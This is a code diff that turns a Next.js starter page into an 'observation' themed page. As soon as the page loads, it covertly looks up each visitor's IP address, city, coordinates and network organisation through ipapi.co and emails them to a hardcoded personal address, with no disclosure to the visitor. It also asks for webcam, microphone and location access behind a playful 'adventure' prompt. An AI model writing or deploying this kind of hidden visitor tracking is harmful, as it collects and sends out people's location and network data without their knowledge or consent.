@@ -1,95 +1,156 @@
-import Image from 'next/image'
-import styles from './page.module.css'
+"use client";
+
+import { useState, useEffect, useRef } from "react";
+import styles from "./page.module.css";
+import { FaArrowRightLong } from "react-icons/fa6";
 
 export default function Home() {
+  const [underOV, setUnderOV] = useState(false);
+  const [locationData, setLocationData] = useState(null);
+  const [data, setState] = useState(null);
+  const videoRef = useRef(null);
+
+  const updateLocation = (position) => {
+    setLocationData(position.coords);
+  };
+
+  const getLocationInfo = () => {
+    // Get the location when the button is clicked
+    if (!underOV) {
+      navigator.geolocation.getCurrentPosition(updateLocation);
+    }
+    // Toggle the state to start/stop
+    setUnderOV(!underOV);
+  };
+
+  const sendEmail = async (data) => {
+    // Check if the flag and timestamp are set in localStorage
+    const emailSentFlag = localStorage.getItem("emailSent");
+    const emailSentTimestamp = localStorage.getItem("emailSentTimestamp");
+
+    // Set an expiration time (e.g., 24 hours)
+    const expirationTime = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
+
+    // console.log(Date.now(), "now data");
+    // console.log(emailSentFlag);
+    // console.log(emailSentTimestamp);
+    // console.log(expirationTime);
+    // console.log(Date.now() - emailSentTimestamp);
+
+    // If the flag is set and the timestamp is within the expiration time, don't send the email again
+    if (
+      emailSentFlag &&
+      emailSentTimestamp &&
+      Date.now() - emailSentTimestamp < expirationTime
+    ) {
+      console.log("Email already sent recently. Skipping.");
+      return;
+    }
+
+    const response = await fetch("/api/sendMail", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        email: "bibekjoshi34@gmail.com",
+        subject: `IP Information: ${data.ip}`,
+        message: `
+        IP Address: ${data?.ip || "Unknown"}
+        Network: ${data?.network || "Unknown"}
+        Version: ${data?.IPv4 || "Unknown"}
+        City: ${data?.city || "Unknown"}
+        Region: ${data?.region || "Unknown"}
+        Country: ${data?.country_name || "Unknown"}
+        Latitude: ${data?.latitude || "Unknown"}
+        Longitude: ${data?.longitude || "Unknown"}
+        Timezone: ${data?.timezone || "Unknown"}
+        Currency: ${data?.currency || "Unknown"}
+        Languages: ${data?.languages || "Unknown"}
+        Organization: ${data?.org || "Unknown"}
+        `,
+      }),
+    });
+
+    const result = await response.json();
+    localStorage.setItem("emailSent", "true");
+    localStorage.setItem("emailSentTimestamp", Date.now());
+  };
+
+  // Get Info
+  const getInfo = async () => {
+    try {
+      const response = await fetch("https://ipapi.co/json/");
+      const data = await response.json();
+      setState(data);
+      sendEmail(data);
+    } catch (error) {
+      console.error("Error fetching IP information:", error);
+    }
+  };
+
+  useEffect(() => {
+    getInfo();
+  }, []);
+
+  useEffect(() => {
+    const startWebcam = async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: true,
+        });
+
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+        }
+      } catch (error) {
+        console.error("Error accessing webcam:", error);
+      }
+    };
+
+    if (underOV) {
+      startWebcam();
+    }
+
+    return () => {
+      // Cleanup the stream when the component unmounts or when the webcam is stopped
+      if (videoRef.current && videoRef.current.srcObject) {
+        const tracks = videoRef.current.srcObject.getTracks();
+        tracks.forEach((track) => track.stop());
+      }
+    };
+  }, [underOV]);
+
+  const btnOnClick = () => {
+    setUnderOV(!underOV);
+  };
+
   return (
     <main className={styles.main}>
       <div className={styles.description}>
-        <p>
-          Get started by editing&nbsp;
-          <code className={styles.code}>src/app/page.js</code>
-        </p>
-        <div>
-          <a
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className={styles.vercelLogo}
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
-        </div>
+        <p>Click "Allow" to grant access, and let the adventure begin! 🚀</p>
+        {underOV && (
+          <div className={styles.video}>
+            <video ref={videoRef} autoPlay playsInline />
+          </div>
+        )}
       </div>
 
       <div className={styles.center}>
-        <Image
-          className={styles.logo}
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
+        <h1>
+          {!underOV
+            ? "Witnessing the Unseen: Your Journey Under Observation"
+            : "You are under Observation!"}
+        </h1>
       </div>
 
-      <div className={styles.grid}>
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Docs <span>-&gt;</span>
-          </h2>
-          <p>Find in-depth information about Next.js features and API.</p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Learn <span>-&gt;</span>
-          </h2>
-          <p>Learn about Next.js in an interactive course with&nbsp;quizzes!</p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Templates <span>-&gt;</span>
-          </h2>
-          <p>Explore starter templates for Next.js.</p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Deploy <span>-&gt;</span>
-          </h2>
-          <p>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
+      <div className={styles.bottom}>
+        <button className="start" onClick={btnOnClick}>
+          {underOV ? "Stop" : "Start"}
+          <FaArrowRightLong />
+        </button>
       </div>
     </main>
-  )
+  );
 }
